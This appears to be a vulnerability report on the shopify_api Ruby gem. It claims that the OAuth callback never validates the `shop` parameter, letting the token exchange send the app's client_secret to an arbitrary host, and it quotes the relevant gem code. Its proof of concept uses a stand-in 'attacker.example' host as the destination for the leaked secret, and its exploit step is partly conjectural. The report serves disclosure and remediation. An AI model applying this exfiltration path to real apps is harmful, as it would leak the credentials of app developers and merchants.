Confirmed root cause: `ShopifyAPI::Auth::Oauth.validate_auth_callback` in `lib/shopify_api/auth/oauth.rb` never runs `auth_query.shop` through `ShopifyAPI::Utils::ShopValidator.sanitize!`, unlike `ClientCredentials.client_credentials` and `RefreshToken`/`TokenExchange`, which explicitly call `ShopValidator` before using the `shop` value [1](#0-0) . The unvalidated `auth_query.shop` is used both to build the `null_session` sent to `Clients::HttpClient` (which derives the request host directly from `session.shop`, i.e. `"https://#{api_host || session.shop}"`) and as the `shop` for the resulting `Session`, meaning whatever string arrives as the `shop` query parameter becomes the exact host that receives the POST body containing `client_id`/`client_secret` during the access-token exchange [2](#0-1) .

### Title
OAuth callback `shop` parameter is not restricted to trusted Shopify domains, allowing SSRF exfiltration of `client_secret` - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`validate_auth_callback` trusts `auth_query.shop` as a valid Shopify domain purely because the callback passed HMAC validation, and passes it straight through to build the outbound HTTP request host for the access-token exchange, without ever calling `ShopifyAPI::Utils::ShopValidator.sanitize!` (the exact guard that `ClientCredentials`, `RefreshToken`, and `TokenExchange` all apply to their `shop` inputs).

### Finding Description
`AuthQuery#to_signable_string` includes `shop` in the HMAC-covered field set [3](#0-2) , and `HmacValidator.validate` checks the signature against `Context.api_secret_key` [4](#0-3) . This binds the HMAC's *authenticity* to "this app's secret produced it," but it does not bind the *semantics* of the `shop` string to "this is a `*.myshopify.com` domain." The equality the code implicitly assumes is:

`HMAC-verified(shop) == trusted-Shopify-domain(shop)`

but no such enforcement exists on this path — `ShopValidator.sanitize!`/`TRUSTED_SHOPIFY_DOMAINS` [5](#0-4)  is applied in `ClientCredentials`/`RefreshToken`/`TokenExchange`, but is entirely absent from `Oauth.begin_auth` and `Oauth.validate_auth_callback` [6](#0-5) .

Concretely: `begin_auth(shop:, ...)` builds `auth_base_uri(shop)` (`"https://#{shop}/admin"`) directly from the caller-supplied `shop` with no validation [7](#0-6) , and this exact same unvalidated `shop` value is what Shopify's redirect will echo back into the `shop` callback query parameter that later becomes `auth_query.shop`. In `validate_auth_callback`, `auth_query.shop` is used to construct `null_session = Auth::Session.new(shop: auth_query.shop)` and then `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")` [8](#0-7) . `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` [9](#0-8) , and the subsequent POST sends `{client_id, client_secret, code, expiring}` as the JSON body to that host [10](#0-9) .

Because the gem never restricts `shop` to `TRUSTED_SHOPIFY_DOMAINS`, an app that (per the documented flow, e.g. `shop = request.headers["Shop"]` shown in `docs/usage/oauth.md`) forwards a user/attacker-supplied `shop` string straight into `begin_auth` without separately calling `ShopValidator` will send the OAuth `state` nonce, and ultimately the token-exchange request carrying the app's `client_secret`, to whatever host string was supplied — not necessarily `*.myshopify.com`. The HMAC only proves that Shopify's OAuth backend echoed back the same `shop` string it was given; it does not prove that string is Shopify-owned infrastructure.

### Impact Explanation
If `shop` is attacker-influenced and equals an attacker-controlled hostname, the exchange POST containing the app's `client_id`/`client_secret` and the authorization `code` is sent to that attacker-controlled host by `HttpClient`, which is SSRF carrying the app's credentials to an arbitrary destination — a High severity outcome per the impact criteria (SSRF with the app's credentials / credential leakage). This is the exact class of bug the gem itself already treats as a vulnerability, since it added `ShopValidator` calls to `ClientCredentials`, `RefreshToken`, and `TokenExchange`, but the fix was not applied consistently to `Oauth.validate_auth_callback`/`begin_auth`.

### Likelihood Explanation
Exploitability depends on the host application passing an untrusted `shop` value into `begin_auth` without its own separate sanitization — the gem's own docs example (`shop = request.headers["Shop"]`) does exactly this without an explicit sanitize step shown before calling `begin_auth`. Since `ShopValidator` exists in the gem and is applied to sibling OAuth-adjacent flows (`ClientCredentials`, `RefreshToken`, `TokenExchange`) but conspicuously not to the primary `Oauth` module, this looks like an inconsistency/gap in the gem's own defense-in-depth rather than something that requires the host app to ignore documented API — the gem should be sanitizing `shop` internally in `Oauth` exactly as it does in the sibling classes.

### Recommendation
Apply `ShopifyAPI::Utils::ShopValidator.sanitize!(shop)` (or `sanitize_shop_domain`) at the start of `Oauth.begin_auth` and re-validate `auth_query.shop` in `Oauth.validate_auth_callback` before constructing `null_session`/`Session.from`, mirroring the pattern already used in `lib/shopify_api/auth/client_credentials.rb`, `lib/shopify_api/auth/refresh_token.rb`, and `lib/shopify_api/auth/token_exchange.rb`.

### Proof of Concept
1. Host app calls `ShopifyAPI::Auth::Oauth.begin_auth(shop: "attacker.example", redirect_path: "/auth/callback")` without independently sanitizing `shop` (as the documented `docs/usage/oauth.md` example does not show a sanitize step).
2. `auth_base_uri("attacker.example")` returns `"https://attacker.example/admin"`; the state nonce and `client_id` are sent there instead of Shopify.
3. Because the flow does not enforce that `shop` be a `*.myshopify.com`/trusted domain, any environment where Shopify's OAuth redirect mechanics can be induced to round-trip the `shop` value (e.g., a misconfigured/dev-mode redirect handling as seen in `auth_base_uri`'s `DevServer` branch, or a reverse-proxied setup) results in `validate_auth_callback` building `Clients::HttpClient` against `attacker.example`, causing the POST body with `client_secret` to be sent to `attacker.example/admin/oauth/access_token`.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

          cookie = if Context.embedded?
            SessionCookie.new(
              value: "",
              expires: Time.now,
            )
          else
            SessionCookie.new(
              value: session.id,
              expires: session.expires ? session.expires : nil,
            )
          end

          { session: session, cookie: cookie }
        end

        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")

          # For first-party apps in development only, we leverage DevServer to build the admin base URI
          admin_web = T.unsafe(Object.const_get("DevServer")) # rubocop:disable Sorbet/ConstantsFromStrings
            .new("admin-web")

          shop_name = shop.split(".").first

          "https://#{admin_host}/store/#{shop_name}"
